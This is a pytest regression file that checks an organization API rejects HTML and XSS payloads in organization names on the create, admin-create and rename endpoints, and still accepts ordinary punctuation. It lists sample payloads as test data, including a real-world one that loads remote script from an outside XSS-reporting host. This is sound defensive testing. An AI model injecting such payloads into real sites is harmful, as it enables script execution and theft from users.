"""Tests that organization names reject HTML/XSS payloads.

Regression coverage for an incident where an organization was created with an
HTML/JS XSS payload as its ``name`` (e.g. ``<script>alert(document.domain)</script>``),
which then persisted in the database. Names are validated server-side via
``orchestra.web.api.utils.safe_text``.
"""

import pytest
from fastapi import status
from httpx import AsyncClient

from orchestra.tests.utils import ADMIN_HEADERS, create_test_user

# Sample of the real-world payload plus minimal angle-bracket cases.
XSS_NAMES = [
    '"><h1>albus dumbledore</h1><img/src/onerror=import(\'//xss.report/c/a8x\')>',
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "Acme <b>Corp</b>",
]


@pytest.mark.anyio
@pytest.mark.parametrize("bad_name", XSS_NAMES)
async def test_create_organization_rejects_xss_name(
    client: AsyncClient,
    bad_name: str,
):
    """Public org creation must reject names containing HTML markup."""
    owner = await create_test_user(client, "xss_org_owner@test.com")
    response = await client.post(
        "/v0/organizations",
        json={"name": bad_name},
        headers=owner["headers"],
    )
    assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY, response.json()
    assert response.json()["detail"][0]["loc"][-1] == "name"


@pytest.mark.anyio
@pytest.mark.parametrize("bad_name", XSS_NAMES)
async def test_admin_create_organization_rejects_xss_name(
    client: AsyncClient,
    bad_name: str,
):
    """Admin org creation must also reject HTML markup in names."""
    owner = await create_test_user(client, "xss_admin_org_owner@test.com")
    response = await client.post(
        "/v0/admin/organizations",
        json={"name": bad_name, "creator_user_id": owner["id"]},
        headers=ADMIN_HEADERS,
    )
    assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY, response.json()


@pytest.mark.anyio
async def test_update_organization_rejects_xss_name(client: AsyncClient):
    """Renaming an org to an HTML payload must be rejected."""
    owner = await create_test_user(client, "xss_org_rename@test.com")
    create = await client.post(
        "/v0/organizations",
        json={"name": "Legit Org For Rename"},
        headers=owner["headers"],
    )
    assert create.status_code == status.HTTP_201_CREATED, create.json()
    org_id = create.json()["id"]

    response = await client.patch(
        f"/v0/organizations/{org_id}",
        json={"name": "<svg onload=alert(1)>"},
        headers=owner["headers"],
    )
    assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY, response.json()


@pytest.mark.anyio
async def test_create_organization_accepts_normal_name(client: AsyncClient):
    """Names with ordinary punctuation must still be accepted."""
    owner = await create_test_user(client, "legit_org_owner@test.com")
    response = await client.post(
        "/v0/organizations",
        json={"name": "O'Brien & Sons (UK) — Team #1"},
        headers=owner["headers"],
    )
    assert response.status_code == status.HTTP_201_CREATED, response.json()
    assert response.json()["name"] == "O'Brien & Sons (UK) — Team #1"
